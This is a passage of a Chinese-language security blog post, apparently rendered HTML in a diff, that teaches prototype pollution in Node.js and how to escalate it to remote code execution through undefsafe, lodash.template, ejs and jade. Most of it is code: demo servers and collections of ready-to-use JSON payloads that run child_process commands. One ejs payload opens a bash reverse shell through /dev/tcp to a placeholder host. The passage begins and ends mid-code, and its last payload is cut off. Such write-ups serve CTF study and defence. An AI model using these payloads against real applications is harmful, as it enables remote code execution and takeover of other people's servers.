class="hljs-number">3</span>],<br>            <span class="hljs-params">e:</span> &#x27;skysec&#x27;<br>        &#125;<br>    &#125;<br>&#125;;<br>console.log(object)<br><span class="hljs-operator">//</span> &#123; <span class="hljs-params">a:</span> &#123; <span class="hljs-params">b:</span> &#123; <span class="hljs-params">c:</span> <span class="hljs-number">1</span>, <span class="hljs-params">d:</span> [Array], <span class="hljs-params">e:</span> &#x27;skysec&#x27; &#125; &#125; &#125;<br>a(object,&#x27;a.f.e&#x27;,&#x27;<span class="hljs-number">123</span>&#x27;)<br>console.log(object)<br><span class="hljs-operator">//</span> &#123; <span class="hljs-params">a:</span> &#123; <span class="hljs-params">b:</span> &#123; <span class="hljs-params">c:</span> <span class="hljs-number">1</span>, <span class="hljs-params">d:</span> [Array], <span class="hljs-params">e:</span> &#x27;skysec&#x27; &#125;, <span class="hljs-params">e:</span> &#x27;<span class="hljs-number">123</span>&#x27; &#125; &#125;<br></code></pre></td></tr></table></figure>
+
+<p>访问属性会在上层进行创建并赋值。</p>
+<p>再来看一个简单例子：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> a = require(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> test = &#123;&#125;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;this is &#x27;</span>+test)    <span class="hljs-comment">// 将test对象与字符串&#x27;this is &#x27;进行拼接</span><br><span class="hljs-comment">// this is [object Object]</span><br></code></pre></td></tr></table></figure>
+
+<p>返回：[object Object]，并与this is进行拼接。但是当我们使用 undefsafe 的时候，可以对原型进行污染：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">a(test,<span class="hljs-string">&#x27;__proto__.toString&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;just a evil!&#x27;</span>&#125;)<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;this is &#x27;</span>+test)    <span class="hljs-comment">// 将test对象与字符串&#x27;this is &#x27;进行拼接</span><br><span class="hljs-comment">// this is just a evil!</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到最终输出了 “this is just a evil!”。这就是因为原型链污染导致，当我们将对象与字符串拼接时，即将对象当做字符串使用时，会自动其触发 toString 方法。但由于当前对象中没有，则回溯至原型中寻找，并发现toString方法，同时进行调用，而此时原型中的toString方法已被我们污染，因此可以导致其输出被我们污染后的结果。</p>
+<h2 id="触发方法"><a href="#触发方法" class="headerlink" title="触发方法"></a>触发方法</h2><p>注意，上面是原型链污染过程，但是污染之后我们还得触发，这样才能利用。</p>
+<h3 id="配合-lodash-template"><a href="#配合-lodash-template" class="headerlink" title="配合 lodash.template"></a>配合 lodash.template</h3><p>Lodash.template 是 Lodash 中的一个简单的模板引擎，创建一个预编译模板方法，可以插入数据到模板中 “interpolate” 分隔符相应的位置。 详情请看：<a target="_blank" rel="noopener" href="http://lodash.think2011.net/template">http://lodash.think2011.net/template</a></p>
+<p>在 Lodash 的原型链污染中，为了实现代码执行，我们常常会污染 template 中的 <code>sourceURL</code> 属性，即给所有 Object 对象中都插入一个 <code>sourceURL</code> 属性，然后通过 lodash.template 方法中的拼接实现任意代码执行漏洞。</p>
+<p>可参考<code>[Code-Breaking 2018] Thejs</code>。</p>
+<p>示例payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">//能进行命令执行，但无法控制回显，可以直接反弹shell</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;sourceURL&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;x\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;)&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-comment">//如果环境不出网，想要拿到回显就要改变Function()的返回值，直接用匿名函数返回命令执行的结果</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;sourceURL&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;x\nreturn function()&#123;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()&#125;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-comment">//p牛的payload，每次污染前先复原一下Object，一个环境可以多次执行</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;sourceURL&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\u000areturn e =&gt; &#123; for (var a in &#123;&#125;) &#123; delete Object.prototype[a];&#125;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&#125;\u000a//&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;sourceURL&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;\u000areturn e =&gt;&#123;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>为什么要污染 sourceURL 呢？我们看到 <code>lodash.template</code> 的代码：<a target="_blank" rel="noopener" href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// Use a sourceURL for easier debugging.</span><br><span class="hljs-keyword">var</span> sourceURL = <span class="hljs-string">&#x27;sourceURL&#x27;</span> <span class="hljs-keyword">in</span> options ? <span class="hljs-string">&#x27;//# sourceURL=&#x27;</span> + options.<span class="hljs-property">sourceURL</span> + <span class="hljs-string">&#x27;\n&#x27;</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">var</span> result = <span class="hljs-title function_">attempt</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Function</span>(importsKeys, sourceURL + <span class="hljs-string">&#x27;return &#x27;</span> + source)<br>  .<span class="hljs-title function_">apply</span>(<span class="hljs-literal">undefined</span>, importsValues);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>可以看到 sourceURL 属性是通过一个三目运算法赋值，其默认值为空。再往下看可以发现 sourceURL 被拼接进 Function 函数构造器的第二个参数，造成任意代码执行漏洞。所以我们通过原型链污染 sourceURL 参数构造 chile_process.exec  就可以执行任意代码了。但是要注意，Function 环境下没有 <code>require</code> 函数，直接使用<code>require(&#39;child_process&#39;)</code> 会报错，所以我们要用 <code>global.process.mainModule.constructor._load</code> 来代替。</p>
+<h3 id="配合-ejs-模板引擎"><a href="#配合-ejs-模板引擎" class="headerlink" title="配合 ejs 模板引擎"></a>配合 ejs 模板引擎</h3><p>Nodejs 的 ejs 模板引擎存在一个利用原型污染进行 RCE 的一个漏洞。可参考<code>[XNUCA 2019 Qualifier]Hardjs</code></p>
+<p>示例代码：</p>
+<ul>
+<li>app.js</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> ejs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-comment">//设置模板的位置与种类</span><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, __dirname);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views engine&#x27;</span>,<span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-comment">//对原型进行污染</span><br><span class="hljs-keyword">var</span> malicious_payload = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2&quot;&#125;&#125;&#x27;</span>;<br>lodash.<span class="hljs-title function_">merge</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(malicious_payload));<br><br><span class="hljs-comment">//进行渲染</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-property">render</span> (<span class="hljs-string">&quot;index.ejs&quot;</span>,&#123;<br>        <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;whoami test&#x27;</span><br>    &#125;);<br>&#125;);<br><br><span class="hljs-comment">//设置http</span><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-keyword">var</span> host = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">address</span><br>    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span><br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;应用实例，访问地址为 http://%s:%s&quot;</span>, host, port)<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>index.ejs</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&lt;%= message%&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>在 app.js 里可以得知使用的是 ejs 模板引擎</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">engine</span>(<span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ejs&#x27;</span>).<span class="hljs-property">__express</span>); <br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>ejs 的 renderFile 进入</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">exports</span>.<span class="hljs-property">renderFile</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>...<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">tryHandleCache</span>(opts, data, cb);<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>跟进 tryHandleCache 函数, 发现一定会进入 handleCache 函数</p>
+<p>跟进 handleCache 函数</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleCache</span>(<span class="hljs-params">options, template</span>) &#123;<br>...<br>    func = <span class="hljs-built_in">exports</span>.<span class="hljs-title function_">compile</span>(template, options);<br>...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后跟进 complie 函数, 会发现有大量的渲染拼接</p>
+<p>这里将 <code>opts.outputFunctionName</code> 拼接到 prepended 中，prepended 在最后会被传递给 this.source 并被带入函数执行。所以如果能够覆盖 <code>opts.outputFunctionName</code> , 这样我们构造的payload就会被拼接进js语句中，并在 ejs 渲染时进行 RCE。在 ejs 中还有一个 <code>render</code> 方法，其最终也是进入了 <code>compile</code>。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">prepended += <span class="hljs-string">&#x27;  var &#x27;</span> + opts.<span class="hljs-property">outputFunctionName</span> + <span class="hljs-string">&#x27; = __append;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br><span class="hljs-comment">// After injection</span><br>prepended += <span class="hljs-string">&#x27; var __tmp1; return global.process.mainModule.constructor._load(&#x27;</span>child_process<span class="hljs-string">&#x27;).execSync(&#x27;</span>dir<span class="hljs-string">&#x27;); __tmp2 = __append;&#x27;</span><br><span class="hljs-comment">// 拼接了命令语句</span><br></code></pre></td></tr></table></figure>
+
+<p>最后给出几个 ejs 模板引擎 RCE 常用的 POC：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//命令执行，execSync</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(&#x27;calc&#x27;);var __tmp2&quot;</span>&#125;&#125;<br><br><span class="hljs-comment">//命令执行，exec</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;calc&#x27;);var __tmp2&quot;</span>&#125;&#125;<br><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;<br><br><span class="hljs-comment">//用return拿到回显</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;x\nreturn global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)\nx&quot;</span>&#125;&#125;<br><br><span class="hljs-comment">//其他示例</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;a=1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;); //&quot;</span>&#125;&#125;&#125;<br><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;__tmp1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;); __tmp2&quot;</span>&#125;&#125;&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>同样 ejs 模板还存在另一处 RCE</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> escapeFn = opts.<span class="hljs-property">escapeFunction</span>;<br><span class="hljs-keyword">var</span> ctor;<br>...<br>    <span class="hljs-keyword">if</span> (opts.<span class="hljs-property">client</span>) &#123;<br>    src = <span class="hljs-string">&#x27;escapeFn = escapeFn || &#x27;</span> + escapeFn.<span class="hljs-title function_">toString</span>() + <span class="hljs-string">&#x27;;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span> + src;<br>    <span class="hljs-keyword">if</span> (opts.<span class="hljs-property">compileDebug</span>) &#123;<br>        src = <span class="hljs-string">&#x27;rethrow = rethrow || &#x27;</span> + rethrow.<span class="hljs-title function_">toString</span>() + <span class="hljs-string">&#x27;;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span> + src;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>伪造 <code>opts.escapeFunction</code> 也可以进行 RCE</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1\nreturn global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;compileDebug&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;debug&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;compileDebug&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;compileDebug&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;debug&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="配合-jade-模板引擎"><a href="#配合-jade-模板引擎" class="headerlink" title="配合 jade 模板引擎"></a>配合 jade 模板引擎</h3><p>示例代码：</p>
+<ul>
+<li>app.js</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> lodash= <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> jade = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jade&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-comment">//设置模板的位置与种类</span><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, __dirname);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;view engine&quot;</span>, <span class="hljs-string">&quot;jade&quot;</span>);<br><br><span class="hljs-comment">//对原型进行污染</span><br><span class="hljs-keyword">var</span> malicious_payload = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;console.log(global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;))&quot;&#125;&#125;&#x27;</span>;<br>lodash.<span class="hljs-title function_">merge</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(malicious_payload));<br><br><span class="hljs-comment">//进行渲染</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-property">render</span> (<span class="hljs-string">&quot;index.jade&quot;</span>,&#123;<br>        <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;whoami test&#x27;</span><br>    &#125;);<br>&#125;);<br><br><span class="hljs-comment">//设置http</span><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-keyword">var</span> host = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">address</span><br>    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span><br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;应用实例，访问地址为 http://%s:%s&quot;</span>, host, port)<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>index.jade</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">h1 #&#123;message&#125;<br>p #&#123;message&#125;<br></code></pre></td></tr></table></figure>
+
+<p>调用链：</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl">调用链<span class="hljs-number">1</span>：<br>__<span class="hljs-function"><span class="hljs-title">express</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">renderFile</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">handleTemplateCache</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">compile</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">parse</span>() -&gt;</span> <span class="hljs-function"><span class="hljs-title">compiler</span>.compile() -&gt;</span> visit()<br>调用链<span class="hljs-number">2</span>：<br>在visit中跟进会发现中途会进入visitTag，而在visitTag中存在一个undefined变量；继续跟进visitCode函数<br>任意文件读污染链：<br>在visit函数中，当我们能控制line或者filename时，可以利用报错信息来读出任意文件的部分内容<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>最终的 Payload 如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//调用链1</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;))\nreturn 